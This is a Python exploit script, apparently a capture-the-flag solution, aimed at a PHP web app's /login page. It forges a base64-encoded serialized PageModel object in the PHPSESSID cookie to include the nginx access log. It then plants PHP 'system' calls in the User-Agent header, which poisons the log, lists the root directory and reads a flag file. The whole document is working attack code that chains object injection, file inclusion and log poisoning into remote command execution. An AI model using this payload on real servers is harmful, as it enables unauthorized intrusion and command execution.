import requests
import sys
import base64
import re

url = "http://" + sys.argv[1] + "/login"
phpsessid = 'O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}'
headers = {
    "Host": sys.argv[1],
    "User-Agent": "<?php system('ls /');?>",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Connection": "close",
    "Cookie": "PHPSESSID="+base64.b64encode(phpsessid.encode('ascii')).decode('utf-8'),
    "Upgrade-Insecure-Requests": "1"
}
with requests.session() as s:
    s.headers.update(headers)
    s.get(url)
    resp = s.get(url)
    flag_name = re.findall("(flag_[\S]+)", resp.text)
    print(flag_name)
    headers["User-Agent"] = f"<?php system('cat /{flag_name[0]}');?>"
    s.headers.update(headers)
    s.get(url)
    resp = s.get(url)
    print(resp.text)


